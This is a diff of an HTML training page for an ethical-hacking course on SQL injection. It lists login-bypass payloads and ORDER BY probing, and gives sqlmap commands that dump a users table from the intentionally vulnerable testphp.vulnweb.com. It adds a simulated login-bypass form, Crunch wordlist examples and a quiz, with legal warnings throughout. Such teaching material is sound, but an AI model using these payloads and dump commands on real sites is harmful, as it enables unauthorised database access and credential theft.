-    Reference video:
-    <a href="https://screenrec.com/share/oxL4adsrOX" target="_blank">https://screenrec.com/share/oxL4adsrOX</a>
-  </p>
-</div>
-
-<!-- PAGE 4 -->
-<div class="section">
-  <h2>Website Database Hacking Without Using Any Tool</h2>
-
-  <p>Hacking a database without any tool first 3 steps are same as hacking using tool only.</p>
-
-  <h3>How to Check Vulnerability</h3>
-  <pre><code>websiteurl.php?uid=1'</code></pre>
-
-  <p>Example:</p>
-  <pre><code>http://testphp.vulnweb.com/artists.php?artist=1'</code></pre>
-
-  <h3>Finding Number of Columns (Trail and Error)</h3>
-  <pre><code>websiteurl.php?uid=1 order by 5 --</code></pre>
-
-  <p>
-    Important note: If page does not change then use different integers like 3, 4, 6, 7 etc.
-  </p>
-
-  <p>
-    Reference video:
-    <a href="https://screenrec.com/share/rlZRVFyLWE" target="_blank">https://screenrec.com/share/rlZRVFyLWE</a>
-  </p>
-</div>
-
-<!-- PAGE 5 -->
-<div class="section">
-  <h2>Create Dictionary Using Crunch Commands</h2>
-
-  <h3>What is Crunch</h3>
-  <p>
-    Crunch is a wordlist generation tool that comes pre-installed in Kali Linux.
-    It’s commonly used in penetration testing to create custom password lists for tools like
-    aircrack-ng, hydra, john, etc.
-  </p>
-
-  <h3>Usage or syntax</h3>
-  <pre><code>crunch &lt;min&gt; &lt;max&gt;</code></pre>
-
-  <h3>Examples</h3>
-  <pre><code>crunch 3 8 liger -o /root/Desktop/liger.txt
-crunch 5 8 liger@$ -o /root/Desktop/liger.txt</code></pre>
-
-  <p>
-    where -o : output<br>
-    /root/Desktop/liger.txt : where the output is saved
-  </p>
-
-  <div class="warning">
-    ⚠️ Practice SQL Injection techniques only on systems you own or have explicit permission to test.
-    Unauthorized testing is illegal.
-  </div>
-</div>
-
-<!-- FINAL VIVA SECTION -->
-<div class="section" id="vivaSection" style="
-  margin-top:100px;
-  border:2px dashed #22c55e;
-  background:linear-gradient(180deg,#020617,#020617);
-">
-  <h2 style="
-    text-align:center;
-    color:#22c55e;
-    font-size:1.9rem;
-    margin-bottom:10px;
-    text-shadow:0 0 10px rgba(34,197,94,0.6);
-  ">🎓 Final Viva Assessment</h2>
-
-  <p style="
-    text-align:center;
-    color:#94a3b8;
-    max-width:750px;
-    margin:0 auto 30px;
-    font-size:0.95rem;
-  ">
-    This assessment is locked until you scroll and read the entire module.
-    Once unlocked, you will have <strong>5 minutes</strong> to complete the viva.
-    Minimum passing score: <strong>80%</strong>.
-  </p>
-
-  <p id="vivaStatus" style="text-align:center; color:#ef4444; font-weight:600;">
-    🔒 Assessment Locked – Please read the full content
-  </p>
-
-  <p id="timer" style="text-align:center; font-size:1.1rem; margin-top:15px; color:#22d3ee; display:none;">
-    ⏳ Time Left: 05:00
-  </p>
-
-  <form id="quizForm" style="max-width:850px; margin:40px auto; display:none;">
-
-    <div style="margin-bottom:30px;">
-      <p><strong>1. What is SQL Injection?</strong></p>
-      <label><input type="radio" name="q1" value="0"> A network attack</label><br>
-      <label><input type="radio" name="q1" value="1"> Injecting malicious SQL into input fields</label><br>
-      <label><input type="radio" name="q1" value="0"> A password cracking method</label>
+      <p>Reference video: <a href="https://screenrec.com/share/oxL4adsrOX" target="_blank">https://screenrec.com/share/oxL4adsrOX</a></p>
     </div>
 
-    <div style="margin-bottom:30px;">
-      <p><strong>2. Which tool is commonly used to automate SQL Injection testing?</strong></p>
-      <label><input type="radio" name="q2" value="1"> SQLmap</label><br>
-      <label><input type="radio" name="q2" value="0"> Hydra</label><br>
-      <label><input type="radio" name="q2" value="0"> Nmap</label>
+    <!-- S4 -->
+    <div class="lab-section" id="s4">
+      <div class="s-head"><span class="s-num">04</span><h2>Website Database Hacking Without Using Any Tool</h2><span class="s-badge sb-purple">Manual</span></div>
+      <p>Hacking a database without any tool first 3 steps are same as hacking using tool only.</p>
+
+      <h3>How to Check Vulnerability</h3>
+      <div style="position:relative;"><pre><div class="pre-label">Payload</div><code>websiteurl.php?uid=1'</code></pre></div>
+      <p>Example:</p>
+      <div style="position:relative;"><pre><div class="pre-label">Example URL</div><code>http://testphp.vulnweb.com/artists.php?artist=1'</code></pre></div>
+
+      <h3>Finding Number of Columns (Trial and Error)</h3>
+      <div style="position:relative;"><pre><div class="pre-label">ORDER BY</div><code>websiteurl.php?uid=1 order by 5 --</code></pre></div>
+      <div class="note-box"><strong>📌 Important:</strong> If page does not change then use different integers like 3, 4, 6, 7 etc. until you get an error — that tells you the number of columns.</div>
+
+      <p>Reference video: <a href="https://screenrec.com/share/rlZRVFyLWE" target="_blank">https://screenrec.com/share/rlZRVFyLWE</a></p>
     </div>
 
-    <div style="margin-bottom:30px;">
-      <p><strong>3. What does the <code>--dbs</code> option in SQLmap do?</strong></p>
-      <label><input type="radio" name="q3" value="1"> Lists databases</label><br>
-      <label><input type="radio" name="q3" value="0"> Dumps passwords</label><br>
-      <label><input type="radio" name="q3" value="0"> Finds open ports</label>
+    <!-- S5 -->
+    <div class="lab-section" id="s5">
+      <div class="s-head"><span class="s-num">05</span><h2>Create Dictionary Using Crunch Commands</h2><span class="s-badge sb-green">Wordlist</span></div>
+
+      <h3>What is Crunch</h3>
+      <p>Crunch is a wordlist generation tool that comes pre-installed in Kali Linux. It's commonly used in penetration testing to create custom password lists for tools like aircrack-ng, hydra, john, etc.</p>
+
+      <h3>Usage or syntax</h3>
+      <div style="position:relative;"><pre><div class="pre-label">Syntax</div><code>crunch &lt;min&gt; &lt;max&gt;</code></pre></div>
+
+      <h3>Examples</h3>
+      <div style="position:relative;"><pre><div class="pre-label">Crunch Examples</div><code>crunch 3 8 liger -o /root/Desktop/liger.txt
+crunch 5 8 liger@$ -o /root/Desktop/liger.txt</code></pre></div>
+      <p>where <code>-o</code> : output &nbsp;|&nbsp; <code>/root/Desktop/liger.txt</code> : where the output is saved</p>
+
+      <div class="warn-box"><strong>⚠️ Legal Warning:</strong> Practice SQL Injection techniques only on systems you own or have explicit permission to test. Unauthorized testing is illegal and a criminal offence.</div>
     </div>
 
-    <div style="margin-bottom:30px;">
-      <p><strong>4. Which payload is commonly used to test SQL Injection vulnerability?</strong></p>
-      <label><input type="radio" name="q4" value="1"> 1'</label><br>
-      <label><input type="radio" name="q4" value="0"> &lt;script&gt;</label><br>
-      <label><input type="radio" name="q4" value="0"> ../../etc/passwd</label>
+    <!-- S6 — LIVE LAB -->
+    <div class="live-lab" id="s6">
+      <div class="live-lab-title"><div class="live-dot"></div>🧪 Interactive Lab — SQL Injection Simulator</div>
+      <div class="live-lab-sub">// Safe practice environment — no real database is harmed</div>
+
+      <div class="target-bar">
+        <span class="target-bar-label">TARGET:</span>
+        <span class="target-bar-url">http://hackforge-lab.local/login.php</span>
+        <span class="target-bar-status tbs-live">● LIVE</span>
+      </div>
+
+      <!-- PART A: Login Bypass -->
+      <h3 style="margin-bottom:12px;">Part A — Login Bypass Simulator</h3>
+      <p style="color:var(--muted);font-size:.88rem;margin-bottom:14px;">The target has a vulnerable login form. Try SQL injection payloads to bypass authentication.</p>
+
+      <div class="sqli-sim">
+        <div class="sim-title">⚡ Vulnerable Login Form — Try to Bypass It</div>
+        <div class="sim-form">
+          <input type="text" class="sim-input" id="sqliUser" placeholder="Username (try: admin' --)" autocomplete="off">
+          <input type="password" class="sim-input" id="sqliPass" placeholder="Password (try: anything)">
+          <button class="sim-btn" onclick="runBypass()">🚀 Attempt Login</button>
+        </div>
+        <div class="sim-result" id="simResult"></div>
+      </div>
+
+      <div class="note-box" style="margin-top:0;"><strong>💡 Hint:</strong> Classic bypass payloads: <code>admin' --</code> | <code>' OR '1'='1</code> | <code>admin'#</code> | <code>' OR 1=1 --</code></div>
+
+      <!-- PART B: SQLmap Terminal -->
+      <h3 style="margin:20px 0 12px;">Part B — SQLmap Command Builder</h3>
+      <p style="color:var(--muted);font-size:.88rem;margin-bottom:14px;">Build and run SQLmap commands step by step against the practice target.</p>
+
+      <div class="terminal">
+        <div class="terminal-header">
+          <div class="term-dot red"></div><div class="term-dot amber"></div><div class="term-dot green"></div>
+          <div class="term-title">KALI LINUX — root@hackforge:~#</div>
+        </div>
+        <div class="terminal-body" id="termOutput">
+          <span class="t-muted">Welcome to HackForge SQLmap Lab</span><br>
+          <span class="t-muted">Target: http://testphp.vulnweb.com</span><br>
+          <span class="t-muted">Type a command below and press Run ↓</span><br>
+        </div>
+        <div class="terminal-input-row">
+          <span class="term-prompt">root@hackforge:~$</span>
+          <input type="text" class="term-input" id="termInput" placeholder="sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs" autocomplete="off" onkeydown="if(event.key==='Enter') runTermCmd()">
+          <button class="run-btn" onclick="runTermCmd()">▶ Run</button>
+        </div>
+      </div>
+
+      <div class="note-box"><strong>🎯 Practice these commands:</strong><br>
+        <code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs</code><br>
+        <code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables</code><br>
+        <code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns</code>
+      </div>
     </div>
 
-    <div style="margin-bottom:40px;">
-      <p><strong>5. Is it legal to test SQL Injection on live websites without permission?</strong></p>
-      <label><input type="radio" name="q5" value="0"> Yes</label><br>
-      <label><input type="radio" name="q5" value="1"> No</label>
+    <!-- S7 — TARGET SERVERS -->
+    <div class="lab-section" id="s7">
+      <div class="s-head"><span class="s-num">07</span><h2>🎯 Legal Target Servers to Practice</h2><span class="s-badge sb-green">Practice</span></div>
+      <p>These are publicly available, intentionally vulnerable websites and labs designed for ethical hacking practice. <strong>Never test on any other website.</strong></p>
+
+      <table class="target-table">
+        <thead><tr><th>Target</th><th>URL</th><th>Type</th><th>SQLi Param</th></tr></thead>
+        <tbody>
+          <tr>
+            <td>DVWA</td>
+            <td><a class="target-link" href="http://www.dvwa.co.uk" target="_blank">http://www.dvwa.co.uk</a></td>
+            <td>Self-hosted lab</td>
+            <td><code>?id=</code></td>
+          </tr>
+          <tr>
+            <td>testphp.vulnweb.com</td>
+            <td><a class="target-link" href="http://testphp.vulnweb.com/artists.php?artist=1" target="_blank">testphp.vulnweb.com</a></td>
+            <td>Live practice server</td>
+            <td><code>?artist=</code></td>
+          </tr>
+          <tr>
+            <td>HackTheBox</td>
+            <td><a class="target-link" href="https://www.hackthebox.com" target="_blank">hackthebox.com</a></td>
+            <td>CTF Labs</td>
+            <td>Various</td>
+          </tr>
+          <tr>
+            <td>TryHackMe SQLi Room</td>
+            <td><a class="target-link" href="https://tryhackme.com/room/sqlilab" target="_blank">tryhackme.com/room/sqlilab</a></td>
+            <td>Guided room</td>
+            <td>Various</td>
+          </tr>
+          <tr>
+            <td>WebGoat (OWASP)</td>
+            <td><a class="target-link" href="https://owasp.org/www-project-webgoat/" target="_blank">owasp.org/webgoat</a></td>
+            <td>Self-hosted lab</td>
+            <td>Various</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="warn-box"><strong>⚠️ Always:</strong> Only test on the targets listed above or targets you own. Any unauthorised testing is illegal under the Computer Misuse Act and similar laws worldwide.</div>
+
+      <h3>Challenge Tasks — Try These on testphp.vulnweb.com</h3>
+      <div class="step-grid">
+        <div class="step-card"><div class="step-num">🔓</div><div><div class="step-title">Task 1 — Detect Vulnerability</div><div class="step-desc">Visit <code>http://testphp.vulnweb.com/artists.php?artist=1'</code> — does the page throw a SQL error? If yes, it's vulnerable.</div></div></div>
+        <div class="step-card"><div class="step-num">🗄️</div><div><div class="step-title">Task 2 — Enumerate Databases</div><div class="step-desc">Run: <code>sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs</code> and note the database names found.</div></div></div>
+        <div class="step-card"><div class="step-num">📋</div><div><div class="step-title">Task 3 — Dump User Table</div><div class="step-desc">Using the <code>acuart</code> database, dump the <code>users</code> table to retrieve credentials: <code>-D acuart -T users --dump</code></div></div></div>
+        <div class="step-card"><div class="step-num">🛡️</div><div><div class="step-title">Task 4 — Prevention</div><div class="step-desc">Research: What is a <strong>prepared statement</strong>? How does parameterised SQL prevent injection? Write a 3-sentence answer.</div></div></div>
+      </div>
     </div>
 
-    <div style="text-align:center;">
-      <button type="button" id="submitBtn" onclick="submitViva()" style="
-        padding:14px 30px;
-        background:#22c55e;
-        color:#020617;
-        border:none;
-        border-radius:8px;
-        font-weight:700;
-        cursor:pointer;
-        box-shadow:0 0 18px rgba(34,197,94,0.5);
-      ">Submit Viva</button>
+    <!-- S8 — VIVA -->
+    <div class="viva-section" id="s8">
+      <div style="text-align:center;margin-bottom:20px;">
+        <div style="font-family:'Orbitron',sans-serif;font-size:1.3rem;font-weight:700;color:var(--accent);margin-bottom:6px;">🎓 Final Viva Assessment</div>
+        <div style="font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);">Locked until you read the full module · 5 minutes · 80% to pass</div>
+      </div>
 
-      <p id="quizResult" style="margin-top:25px; font-weight:600;"></p>
-      <p id="attempts" style="margin-top:10px; color:#94a3b8;"></p>
+      <div id="vivaLocked" class="viva-locked-overlay">
+        <div class="lock-icon">🔒</div>
+        <div class="lock-msg" id="vivaStatus">Scroll to the bottom of the page to unlock the assessment</div>
+      </div>
 
-      <a id="certBtn" href="certificate.html" style="
-        display:none;
-        margin-top:20px;
-        padding:14px 26px;
-        background:#22c55e;
-        color:#020617;
-        font-weight:700;
-        border-radius:8px;
-        text-decoration:none;
-        box-shadow:0 0 20px rgba(34,197,94,0.6);
-      ">🎓 Generate Certificate</a>
+      <div class="viva-timer" id="vivaTimer">05:00</div>
+
+      <form id="quizForm" style="display:none;">
+        <div class="quiz-q">
+          <p>1. What is SQL Injection?</p>
+          <label><input type="radio" name="q1" value="0"> A network attack</label>
+          <label><input type="radio" name="q1" value="1"> Injecting malicious SQL into input fields</label>
+          <label><input type="radio" name="q1" value="0"> A password cracking method</label>
+        </div>
+        <div class="quiz-q">
+          <p>2. Which tool is commonly used to automate SQL Injection testing?</p>
+          <label><input type="radio" name="q2" value="1"> SQLmap</label>
+          <label><input type="radio" name="q2" value="0"> Hydra</label>
+          <label><input type="radio" name="q2" value="0"> Nmap</label>
+        </div>
+        <div class="quiz-q">
+          <p>3. What does the <code>--dbs</code> option in SQLmap do?</p>
+          <label><input type="radio" name="q3" value="1"> Lists databases</label>
+          <label><input type="radio" name="q3" value="0"> Dumps passwords</label>
+          <label><input type="radio" name="q3" value="0"> Finds open ports</label>
+        </div>
+        <div class="quiz-q">
+          <p>4. Which payload is commonly used to test SQL Injection vulnerability?</p>
+          <label><input type="radio" name="q4" value="1"> 1'</label>
+          <label><input type="radio" name="q4" value="0"> &lt;script&gt;</label>
+          <label><input type="radio" name="q4" value="0"> ../../etc/passwd</label>
+        </div>
+        <div class="quiz-q">
+          <p>5. Is it legal to test SQL Injection on live websites without permission?</p>
+          <label><input type="radio" name="q5" value="0"> Yes</label>
+          <label><input type="radio" name="q5" value="1"> No</label>
+        </div>
+        <div class="quiz-q">
+          <p>6. What is the correct SQLmap flag to dump a specific table's data?</p>
+          <label><input type="radio" name="q6" value="0"> --tables</label>
+          <label><input type="radio" name="q6" value="1"> --dump</label>
+          <label><input type="radio" name="q6" value="0"> --columns</label>
+        </div>
+        <div class="quiz-q">
+          <p>7. Which technique limits brute-force to a specific password format?</p>
+          <label><input type="radio" name="q7" value="0"> Dictionary attack</label>
+          <label><input type="radio" name="q7" value="1"> Mask attack</label>
+          <label><input type="radio" name="q7" value="0"> Rainbow table</label>
+        </div>
+
+        <button type="button" class="quiz-submit" onclick="submitViva()">Submit Viva Assessment</button>
+        <div class="quiz-result-box" id="quizResult"></div>
+      </form>
     </div>
 
-  </form>
-</div>
+  </div><!-- /content -->
+  <footer>© 2026 HackForge · <a href="https://github.com/ligerharry44-netizen" target="_blank">GitHub</a> · <a href="https://www.linkedin.com/in/ligerharry44" target="_blank">LinkedIn</a> · <a href="mailto:ligerharry44@gmail.com">Email</a> · Built for ethical cybersecurity learning only.</footer>
+</main>
 
 <script>
-/* LOCK UNTIL SCROLL */
+/* ── READ PROGRESS ── */
+const readInd = document.getElementById('readIndicator');
 window.addEventListener('scroll', () => {
-  if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 50) {
-    document.getElementById('vivaStatus').innerText = '🔓 Assessment Unlocked';
-    document.getElementById('vivaStatus').style.color = '#22c55e';
-    document.getElementById('quizForm').style.display = 'block';
-    startTimer();
-  }
+  const el  = document.documentElement;
+  const pct = el.scrollTop / (el.scrollHeight - el.clientHeight);
+  readInd.style.transform = `scaleX(${pct})`;
+  // update sidebar progress
+  const p = Math.round(pct * 100);
+  document.getElementById('progressFill').style.width = p + '%';
+  document.getElementById('progressPct').textContent  = p + '%';
+  // unlock viva when scrolled to bottom
+  if (pct > 0.96) unlockViva();
 });
 
-/* TIMER */
-let time = 300; // 5 minutes
-let timerInterval;
-function startTimer() {
-  if (timerInterval) return;
-  document.getElementById('timer').style.display = 'block';
-  timerInterval = setInterval(() => {
-    let m = Math.floor(time / 60);
-    let s = time % 60;
-    document.getElementById('timer').innerText = `⏳ Time Left: ${m}:${s.toString().padStart(2,'0')}`;
-    if (--time < 0) {
-      clearInterval(timerInterval);
-      submitViva();
+/* ── ACTIVE TOC ── */
+const sections = document.querySelectorAll('.lab-section[id], .live-lab[id], .viva-section[id]');
+const tocLinks  = document.querySelectorAll('.toc-link');
+const obs = new IntersectionObserver(e => {
+  e.forEach(en => {
+    if (en.isIntersecting)
+      tocLinks.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + en.target.id));
+  });
+}, { rootMargin: '-25% 0px -65% 0px' });
+sections.forEach(s => obs.observe(s));
+
+/* ── LOGIN BYPASS SIMULATOR ── */
+const BYPASS_PAYLOADS = ["admin' --", "admin'--", "' or '1'='1", "' or 1=1 --", "admin'#", "' or '1'='1'--", "' or 1=1#", "1' or '1'='1"];
+function runBypass() {
+  const user   = document.getElementById('sqliUser').value.trim().toLowerCase();
+  const result = document.getElementById('simResult');
+  const isPayload = BYPASS_PAYLOADS.some(p => user.includes(p.split(' ')[0].replace("'","")) || user.includes("'") || user.includes("--") || user.includes("or 1") || user.includes("or '1"));
+  result.style.display = 'block';
+  if (isPayload) {
+    result.className = 'sim-result success';
+    result.innerHTML = `✅ <strong>Authentication Bypassed!</strong><br>
+      SQL query sent: <code>SELECT * FROM users WHERE username='${document.getElementById('sqliUser').value}' --' AND password='...'</code><br>
+      The <code>--</code> comments out the password check. Logged in as: <strong>admin</strong><br>
+      <span style="color:var(--muted);font-size:.78rem;">Flag: <code>FLAG{sql_bypass_success_liger44}</code></span>`;
+  } else {
+    result.className = 'sim-result fail';
+    result.innerHTML = `❌ <strong>Login Failed.</strong> Normal credentials rejected.<br>
+      <span style="color:var(--muted);font-size:.78rem;">Hint: Try adding <code>'</code> or <code>--</code> to your username.</span>`;
+  }
+}
+
+/* ── TERMINAL SIMULATOR ── */
+const sqlResponses = {
+  '--dbs':     `[*] starting @ 14:22:01\n[INFO] testing connection to target URL\n[INFO] testing if the target URL content is stable\n[INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable\n[*] available databases [2]:\n[*] acuart\n[*] information_schema`,
+  '--tables':  `[INFO] fetching tables for database: 'acuart'\n[*] available tables [8]:\n[*] artists\n[*] carts\n[*] categ\n[*] featured\n[*] guestbook\n[*] pictures\n[*] products\n[*] users`,
+  '--columns': `[INFO] fetching columns for table 'users' in database 'acuart'\n[*] columns [8]:\n[*] cart (int)\n[*] cc (varchar)\n[*] email (varchar)\n[*] fname (varchar)\n[*] lname (varchar)\n[*] pass (varchar)\n[*] phone (varchar)\n[*] uname (varchar)`,
+  '--dump':    `[INFO] fetching entries of column(s) '...' for table 'users' in database 'acuart'\nDatabase: acuart\nTable: users\n+---------+----------+----------+\n| uname   | pass     | email    |\n+---------+----------+----------+\n| test    | test     | test@test.com |\n| admin   | admin    | admin@acuart.com |\n+---------+----------+----------+\n[*] Flag: FLAG{dump_acuart_users}`,
+};
+
+function runTermCmd() {
+  const input  = document.getElementById('termInput').value.trim();
+  const output = document.getElementById('termOutput');
+  if (!input) return;
+
+  let response = `<span class="t-red">Command not recognised. Try: sqlmap -u "URL" --dbs</span>`;
+
+  if (input.toLowerCase().includes('sqlmap')) {
+    for (const [key, val] of Object.entries(sqlResponses)) {
+      if (input.includes(key)) {
+        response = val.split('\n').map(l => {
+          if (l.startsWith('[*]')) return `<span class="t-cyan">${l}</span>`;
+          if (l.startsWith('[INFO]')) return `<span class="t-muted">${l}</span>`;
+          return `<span class="t-white">${l}</span>`;
+        }).join('<br>');
+        break;
+      }
     }
+    if (response.includes('not recognised') && input.includes('sqlmap')) {
+      response = `<span class="t-muted">[*] starting @ ${new Date().toLocaleTimeString()}</span><br><span class="t-muted">[INFO] testing connection to target URL...</span><br><span class="t-cyan">[INFO] add --dbs, --tables, --columns, or --dump to get results</span>`;
+    }
+  } else if (input === 'clear') {
+    output.innerHTML = '';
+    document.getElementById('termInput').value = '';
+    return;
+  } else if (input.startsWith('cd') || input.startsWith('ls') || input.startsWith('pwd')) {
+    const resp = { cd:'/root/Desktop', ls:'flag.pdf  flag.zip  wordlist.txt  ziphash.txt', pwd:'/root/Desktop' };
+    response = `<span class="t-white">${resp[input.split(' ')[0]] || ''}</span>`;
+  }
+
+  output.innerHTML += `<br><span class="t-cyan">root@hackforge:~$ </span><span class="t-white">${input}</span><br>${response}<br>`;
+  output.scrollTop = output.scrollHeight;
+  document.getElementById('termInput').value = '';
+}
+
+/* ── VIVA ── */
+let vivaUnlocked = false, timerInterval, vivaTime = 300;
+
+function unlockViva() {
+  if (vivaUnlocked) return;
+  vivaUnlocked = true;
+  document.getElementById('vivaStatus').textContent  = '🔓 Assessment Unlocked — Good luck!';
+  document.getElementById('vivaStatus').style.color  = 'var(--accent)';
+  document.getElementById('vivaLocked').style.display = 'none';
+  document.getElementById('quizForm').style.display  = 'block';
+  document.getElementById('vivaTimer').style.display = 'block';
+  startVivaTimer();
+}
+
+function startVivaTimer() {
+  timerInterval = setInterval(() => {
+    const m = Math.floor(vivaTime / 60);
+    const s = vivaTime % 60;
+    document.getElementById('vivaTimer').textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    if (--vivaTime < 0) { clearInterval(timerInterval); submitViva(); }
   }, 1000);
 }
 
-/* DISABLE COPY IN VIVA */
-document.getElementById('vivaSection').addEventListener('contextmenu', e => e.preventDefault());
-document.getElementById('vivaSection').addEventListener('copy', e => e.preventDefault());
+function submitViva() {
+  clearInterval(timerInterval);
+  const answers = { q1:'1', q2:'1', q3:'1', q4:'1', q5:'1', q6:'1', q7:'1' };
+  let correct = 0, total = Object.keys(answers).length;
+  for (const [q, a] of Object.entries(answers)) {
+    const sel = document.querySelector(`input[name="${q}"]:checked`);
+    if (sel && sel.value === a) correct++;
+  }
+  const pct  = Math.round((correct / total) * 100);
+  const pass = pct >= 80;
+  const box  = document.getElementById('quizResult');
+  box.style.display = 'block';
+  box.style.background = pass ? 'rgba(196,255,0,0.07)' : 'rgba(255,77,77,0.07)';
+  box.style.border      = pass ? '1px solid rgba(196,255,0,0.2)' : '1px solid rgba(255,77,77,0.2)';
+  box.innerHTML = `
+    <div style="font-family:'Orbitron',sans-serif;font-size:1.6rem;color:${pass?'var(--accent)':'var(--danger)'};">${pass?'🏆':'❌'}</div>
+    <div style="font-family:'Orbitron',sans-serif;font-size:1rem;margin:8px 0;color:${pass?'var(--accent)':'var(--danger)'};">${pass?'PASSED':'FAILED'} — ${correct}/${total} (${pct}%)</div>
+    <div style="font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);">Minimum: 80% · You scored: ${pct}%</div>
+    ${pass ? `<br><a class="cert-btn" href="certificate.html?course=SQL+Injection&name=Hacker">🎓 Generate Certificate</a>` : `<br><div style="font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--muted);margin-top:8px;">Re-read the module and scroll back up to try again.</div>`}
+  `;
+  document.getElementById('quizForm').querySelectorAll('input').forEach(i => i.disabled = true);
+  document.getElementById('quizForm').querySelector('.quiz-submit').disabled = true;
+}
 
-<footer>
-  © 2026 HackProof Notes<br>
-  Created and maintained by
-  <span style="color:#22d3ee; font-weight:600;">Liger44</span><br><br>
-
-  <div class="footer-socials">
-    <a href="https://github.com/ligerharry44-netizen" target="_blank">GitHub</a>
-    <span>•</span>
-    <a href="https://www.linkedin.com/in/ligerharry44" target="_blank">LinkedIn</a>
-    <span>•</span>
-    <a href="mailto:ligerharry44@gmail.com">Email</a>
-  </div>
-
-  <p style="font-size:0.75rem; opacity:0.7; margin-top:12px;">
-    Built for ethical cyber security learning only.
-  </p>
-</footer>
+/* disable copy in viva */
+document.getElementById('s8').addEventListener('contextmenu', e => e.preventDefault());
+</script>
 </body>
 </html>
